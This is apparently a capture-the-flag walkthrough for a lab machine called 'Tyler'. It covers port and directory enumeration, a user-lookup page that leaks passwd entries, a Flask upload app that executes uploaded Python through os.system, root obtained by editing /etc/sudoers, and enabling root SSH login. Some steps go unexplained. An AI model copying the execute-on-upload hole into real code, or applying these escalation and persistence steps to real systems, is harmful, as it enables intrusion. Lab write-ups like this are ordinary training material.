# Tyler

## Recon

### nmap

```
# sh recon.sh 10.10.172.202
Host is up.
Starting Nmap 7.80 ( https://nmap.org )
[...]
Not shown: 992 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.16)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
5000/tcp open  http        Werkzeug httpd 1.0.0 (Python 3.6.8)
8080/tcp open  http        nginx 1.16.1
9999/tcp open  abyss?
Service Info: Host: TYLER

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.87 seconds
           Raw packets sent: 1103 (48.508KB) | Rcvd: 1022 (40.912KB)
```

### Gobuster

```
# gobuster dir -u 10.10.172.202 -w /usr/share/wordlists/rockyou.txt -x php,txt -t 100
===============================================================
/upload (Status: 301)
```

Looking at a regular gobuster, there's nothing useful. I uploaded php_reverse_shell.php but I couldn't find where it was uploaded.

### alert.txt

```
cat alert.txt 
Let's keep things interesting... X8JEETQmf3hkS65f
```

### dirsearch.py

```
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
./dirsearch.py -u http://tyler.thm/ -w /usr/share/wordlists/rockyou.txt -e html,txt
/betatest/
```

From here we find something called checkuser.php. Typing in tdurden replies with:

```
tdurden:x:1000:1000::Tyler Durden:/home/tdurden/bin/bash tdurden:x:1000:1000:Tyler Durden:/home/tdurden:/bin/bash
```

Typing narrator gives us:

```
narrator:x:1002:1002::/home/narrator:/bin/bash narrator/:x:1002:1002::/home/narrator/:/bin/bash
```

## SSH

ssh into narrator

```
# ssh narrator@tyler.thm
narrator@tyler.thm's password: 
Last login: Thu Mar 26 10:52:23 2020 from cyberdyne
[narrator@tyler ~]$
```

### app.py

```
#!/usr/bin/python3

import os
from flask import Flask, flash, request, redirect, render_template
from werkzeug.utils import secure_filename
UPLOAD_FOLDER = './uploads'

app = Flask(__name__)
app.secret_key = "secret key"
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024


ALLOWED_EXTENSIONS = set(['txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'py'])

def allowed_file(filename):
	return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
	
@app.route('/')
def upload_form():
	return render_template('upload.html')

@app.route('/', methods=['POST'])
def upload_file():
	if request.method == 'POST':
        # check if the post request has the file part
		if 'file' not in request.files:
			flash('No file part')
			return redirect(request.url)
		file = request.files['file']
		if file.filename == '':
			flash('No file selected for uploading')
			return redirect(request.url)
		if file and allowed_file(file.filename):
			filename = secure_filename(file.filename)
			file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
			os.system('/usr/bin/python3 ' + os.path.join(app.config['UPLOAD_FOLDER'], filename))
			flash('File successfully uploaded')
			return redirect('/')
		else:
			flash('Allowed file types are txt, pdf, png, jpg, jpeg, gif, py')
			return redirect(request.url)

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```

### Privilege Escalation

```
[narrator@tyler ~]$ vim /etc/sudoers
```

From here, you add narrator to the sudoers file:

```
narrator	ALL=(ALL)	ALL
:wq!
```

After this, you type sudo -i to get to root.

## After root

```
vim /etc/ssh/sshd_config
```

Go to `PermitRootLogin` and change the parameter from `no` to `yes`.

```
:wq! # Save your work
```

